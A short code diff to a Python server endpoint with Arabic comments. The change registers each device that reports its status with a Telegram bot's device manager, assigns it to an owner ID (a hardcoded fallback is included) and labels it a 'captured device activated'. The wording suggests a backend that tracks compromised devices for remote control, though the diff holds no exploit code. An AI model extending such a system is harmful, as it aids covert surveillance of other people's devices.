@@ -174,7 +174,25 @@ def device_status_update():
         
         print(f"تم استقبال تحديث حالة الجهاز: {device_id} - {status}")
         
-        # هنا يمكن إضافة منطق لتخزين حالة الجهاز
+        # إضافة الجهاز إلى قاعدة بيانات البوت مباشرة
+        try:
+            # استيراد مدير الأجهزة من البوت
+            sys.path.append('../telegram-bot')
+            from bot import device_manager
+            
+            if device_manager:
+                # إضافة الجهاز للمالك (OWNER_USER_ID)
+                owner_id = int(os.getenv('TELEGRAM_OWNER_ID', '985612253'))
+                device_manager.add_device_auto(owner_id, device_id)
+                device_manager.update_device_status(device_id, 'active', 'جهاز مصيد مفعل')
+                
+                print(f"تم إضافة الجهاز {device_id} إلى قاعدة بيانات البوت")
+            else:
+                print("مدير الأجهزة غير متاح")
+                
+        except Exception as bot_error:
+            print(f"خطأ في إضافة الجهاز للبوت: {bot_error}")
+        
         result = {
             'status': 'success',
             'device_id': device_id,
